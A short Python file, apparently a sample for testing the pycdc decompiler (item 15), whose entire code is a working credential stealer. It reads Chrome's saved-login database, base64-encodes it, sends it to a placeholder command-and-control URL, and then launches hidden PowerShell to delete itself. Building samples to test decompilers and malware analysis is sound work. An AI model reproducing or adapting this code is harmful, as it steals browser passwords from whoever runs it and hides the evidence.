# Amostra de teste (item 15): sem laco, o pycdc descompila inteira no 3.9.
import base64
import os
import subprocess
import urllib.request

C2 = "https://c2.exemplo.invalid/painel"


def coleta():
    caminho = os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "Login Data")
    return base64.b64encode(open(caminho, "rb").read()).decode()


def envia(dados):
    req = urllib.request.Request(C2, data=dados.encode())
    urllib.request.urlopen(req)
    subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", "Remove-Item", __file__])


envia(coleta())
